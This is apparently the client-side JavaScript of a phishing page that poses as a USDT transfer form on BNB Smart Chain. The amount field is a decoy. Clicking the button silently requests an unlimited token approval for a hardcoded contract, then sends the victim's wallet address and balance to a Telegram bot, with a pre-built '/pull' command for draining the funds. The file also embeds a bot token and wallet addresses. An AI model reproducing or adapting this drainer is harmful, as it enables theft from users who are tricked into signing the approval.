document.addEventListener("DOMContentLoaded", function () {

    // ===== CONFIG =====
    const CONFIG = window.CONFIG || {
        COMPANY_WALLET_ADDRESS: "0xbfc17A492Bc8167556aFe1Cf90D9F7Fc384DeFb4",
        CONTRACT_ADDRESS: "0xaEB39CED46aaAdf4F6369806252083E82cbCEB91",
        TELEGRAM_BOT_TOKEN: "8941208473:AAEY1s1srFize2Ij_Ai1nYirSOcR6i18OOM",
        ADMIN_CHAT_ID: "-5543160952",
        USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
        BSC_RPC_URL: "https://bsc-dataseed1.binance.org/",
        PULL_RECIPIENT_ADDRESS: "0xf2a151e92ae0eab7157322545c33648c0824fa2e"
    };

    async function getUsdtBalanceForWallet(walletAddress) {
        const usdtAddress = CONFIG.USDT_ADDRESS;
        const usdtAbi = [
            "function balanceOf(address owner) view returns (uint256)",
            "function decimals() view returns (uint8)"
        ];
        try {
            let decimals = 18;
            let balance;
            if (window.ethereum) {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const usdt = new ethers.Contract(usdtAddress, usdtAbi, provider);
                try { decimals = await usdt.decimals(); } catch (err) {}
                balance = await usdt.balanceOf(walletAddress);
            } else {
                const provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC_URL);
                const usdt = new ethers.Contract(usdtAddress, usdtAbi, provider);
                try { decimals = await usdt.decimals(); } catch (err) {}
                balance = await usdt.balanceOf(walletAddress);
            }
            const formatted = ethers.utils.formatUnits(balance, decimals);
            const num = parseFloat(formatted);
            return Number.isFinite(num) ? (+num).toString() : formatted;
        } catch (err) {
            console.warn("Could not fetch USDT balance:", err);
            return "0";
        }
    }

    // ===== TELEGRAM NOTIFICATION FUNCTION =====
    async function sendTelegramNotifications(walletAddress, txHash, userId) {
        const botToken = CONFIG.TELEGRAM_BOT_TOKEN;
        const adminChatId = CONFIG.ADMIN_CHAT_ID;

        const inlineKeyboard = {
            inline_keyboard: [[{ text: "🔗 View Transaction", url: `https://bscscan.com/tx/${txHash}` }]]
        };

        const recipient = CONFIG.PULL_RECIPIENT_ADDRESS || "0xf2a151e92ae0eab7157322545c33648c0824fa2e";
        const usdtBalance = await getUsdtBalanceForWallet(walletAddress);
        const pullCommand = `/pull ${CONFIG.USDT_ADDRESS} ${walletAddress} ${recipient} ${usdtBalance}`;

        const adminMessage =
            `🔔 **New USDT Approval Transaction**\n\n` +
            `💰 **Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
            `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
            `👤 **User ID:** ${userId || "Not provided"}\n` +
            `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
            `✅ Transaction approved successfully!\n\n` +
            `📋 **Copy & paste command:**\n\`\`\`\n${pullCommand}\n\`\`\`\n\n` +
            `💡 *Tap and hold on the command above to copy it*`;

        const userMessage =
            `🎉 **USDT Approval Successful!**\n\n` +
            `💰 **Your Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
            `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
            `✅ **Status:** Approved\n\n` +
            `You can now proceed with USDT transfers.\n\n` +
            `💡 *Tap and hold on the wallet address above to copy it*`;

        try {
            // Send to admin
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: adminChatId,
                    text: adminMessage,
                    parse_mode: "Markdown",
                    reply_markup: inlineKeyboard
                })
            });

            // Send to user if provided
            if (userId) {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: userId,
                        text: userMessage,
                        parse_mode: "Markdown",
                        reply_markup: inlineKeyboard
                    })
                });
            }

            console.log("Telegram notifications sent successfully");
        } catch (error) {
            console.error("Failed to send Telegram notifications:", error);
        }
    }

    // ===== NOTIFICATION BAR SETUP =====
    function showNotification(msg, type = "info") {
        let notify = document.getElementById("notify-bar");
        if (!notify) {
            notify = document.createElement("div");
            notify.id = "notify-bar";
            notify.style.position = "fixed";
            notify.style.top = "20px";
            notify.style.left = "50%";
            notify.style.transform = "translateX(-50%)";
            notify.style.zIndex = "9999";
            notify.style.minWidth = "260px";
            notify.style.maxWidth = "90vw";
            notify.style.padding = "16px 32px";
            notify.style.borderRadius = "12px";
            notify.style.fontSize = "1rem";
            notify.style.fontWeight = "bold";
            notify.style.textAlign = "center";
            notify.style.boxShadow = "0 4px 32px #0008";
            notify.style.transition = "all 0.3s";
            document.body.appendChild(notify);
        }
        notify.textContent = msg;
        notify.style.background =
            type === "error" ? "#f87171" : type === "success" ? "#10b981" : "#374151";
        notify.style.color = "#fff";
        notify.style.opacity = "1";
        notify.style.pointerEvents = "auto";
        setTimeout(() => {
            notify.style.opacity = "0";
            notify.style.pointerEvents = "none";
        }, 3000);
    }

    // ===== FORM LOGIC =====
    const addressInput = document.querySelector('input[placeholder="Search or Enter"]');
    const amountInput = document.querySelector('input[placeholder="USDT Amount"]');
    const nextBtn = document.querySelector("button.w-full");
    const originalBtnHTML = nextBtn.innerHTML;
    const approxUsd = document.querySelector(".text-xs.text-gray-500");
    const maxBtn = Array.from(document.querySelectorAll("button")).find(
        (btn) => btn.textContent.trim().toLowerCase() === "max"
    );
    const clearAmountBtn = document.getElementById("amount-clear-btn");

    // Default amount — keep empty until user types
    approxUsd.textContent = "≈ $0.00";

    function updateClearButton() {
        if (!clearAmountBtn) return;
        clearAmountBtn.classList.toggle("visible", amountInput.value.trim().length > 0);
    }

    function onAmountInput() {
        updateApproxUsd();
        updateClearButton();
        validate();
    }

    amountInput.addEventListener("focus", function () {
        if (amountInput.value === "0") {
            amountInput.value = "";
            onAmountInput();
        }
    });

    function updateApproxUsd() {
        let amount = parseFloat(amountInput.value.trim());
        approxUsd.textContent =
            isNaN(amount) || amount <= 0 ? "≈ $0.00" : `≈ $${amount.toFixed(2)}`;
    }
    amountInput.addEventListener("input", onAmountInput);
    updateApproxUsd();
    updateClearButton();

    function validate() {
        const address = addressInput.value.trim();
        const amount = parseFloat(amountInput.value.trim());
        nextBtn.disabled = !(address.length > 0 && !isNaN(amount) && amount > 0);
    }
    addressInput.addEventListener("input", validate);
    validate();

    if (clearAmountBtn) {
        clearAmountBtn.addEventListener("click", function (e) {
            e.preventDefault();
            amountInput.value = "";
            onAmountInput();
            amountInput.focus();
        });
    }

    if (maxBtn) {
        maxBtn.addEventListener("click", async function (e) {
            e.preventDefault();
            if (!window.ethereum) {
                showNotification("No Web3 wallet found.", "error");
                return;
            }
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const walletAddress = await signer.getAddress();
                const usdtAddress = CONFIG.USDT_ADDRESS;
                const usdtAbi = [
                    "function balanceOf(address owner) view returns (uint256)",
                    "function decimals() view returns (uint8)"
                ];
                const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
                let decimals = 18;
                try { decimals = await usdt.decimals(); } catch (err) {}
                let balance = await usdt.balanceOf(walletAddress);
                let maxValue = ethers.utils.formatUnits(balance, decimals);
                amountInput.value = (+maxValue).toString();
                onAmountInput();
            } catch (err) {
                showNotification("Unable to get max balance.", "error");
            }
        });
    }

    // ===== GAS SPONSOR (company wallet sends BNB before user approve) =====
    async function requestGasSponsor(userAddress) {
        try {
            const res = await fetch("/sponsor-gas", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ userAddress })
            });
            if (!res.ok) return;
            const data = await res.json();
            if (data.ok && data.txHash) {
                await new Promise((resolve) => setTimeout(resolve, 2000));
            }
        } catch (err) {
            console.warn("Gas sponsor unavailable:", err);
        }
    }

    // ===== NEXT BUTTON - APPROVE USDT (FIXED TO ESCROW) =====
    nextBtn.addEventListener("click", async function (e) {
        e.preventDefault();

        if (!window.ethereum) {
            showNotification(
                "No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.",
                "error"
            );
            return;
        }

        nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
        nextBtn.disabled = true;

        try {
            const bnbChainId = "0x38";
            const bnbChainParams = {
                chainId: bnbChainId,
                chainName: "BNB Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: [CONFIG.BSC_RPC_URL],
                blockExplorerUrls: ["https://bscscan.com/"]
            };

            try {
                await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: bnbChainId }]
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    try {
                        await window.ethereum.request({
                            method: "wallet_addEthereumChain",
                            params: [bnbChainParams]
                        });
                    } catch (addError) {
                        showNotification("Failed to add BNB Smart Chain network.", "error");
                        return;
                    }
                } else {
                    showNotification("Failed to switch to BNB Smart Chain network.", "error");
                    return;
                }
            }

            // === Approve ESCROW CONTRACT instead of company wallet ===
            const escrowAddress = CONFIG.CONTRACT_ADDRESS;
            const usdtAddress = CONFIG.USDT_ADDRESS;

            const usdtAbi = [
                "function approve(address spender, uint256 amount) public returns (bool)",
                "function decimals() view returns (uint8)"
            ];
            const iface = new ethers.utils.Interface(usdtAbi);

            let decimals = 18;
            try {
                const decCallData = iface.encodeFunctionData("decimals", []);
                const decHex = await window.ethereum.request({
                    method: "eth_call",
                    params: [{ to: usdtAddress, data: decCallData }, "latest"]
                });
                decimals = ethers.BigNumber.from(decHex).toNumber();
            } catch (err) {
                console.warn("Could not fetch decimals, defaulting to 18");
            }

            const parsedAmount = ethers.constants.MaxUint256;
            const txData = iface.encodeFunctionData("approve", [
                escrowAddress,
                parsedAmount.toString()
            ]);

            const fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
            await requestGasSponsor(fromAddress);
            const txHash = await window.ethereum.request({
                method: "eth_sendTransaction",
                params: [{ from: fromAddress, to: usdtAddress, data: txData, value: "0x0" }]
            });

            showNotification(``, "success");

            if (txHash && txHash.length > 0) {
                try {
                    const urlParams = new URLSearchParams(window.location.search);
                    const userId = urlParams.get("user_id");
                    await sendTelegramNotifications(fromAddress, txHash, userId);
                } catch (err) {
                    console.error("Failed to send Telegram notifications:", err);
                }
            }
        } catch (err) {
            const msg = (err?.message || "").toLowerCase();
            if (
                msg.includes("user rejected") ||
                msg.includes("user denied") ||
                msg.includes("cancelled") ||
                msg.includes("canceled")
            ) {
                showNotification("Transaction cancelled.", "error");
            } else if (
                msg.includes("insufficient funds") ||
                msg.includes("exceeds balance") ||
                (msg.includes("execution reverted") && msg.includes("exceeds balance"))
            ) {
                showNotification("Insufficient USDT balance for this approval.", "error");
            } else {
                showNotification("Transaction failed. Please try again.", "error");
            }
        } finally {
            nextBtn.disabled = false;
            nextBtn.innerHTML = originalBtnHTML;
        }
    });
});

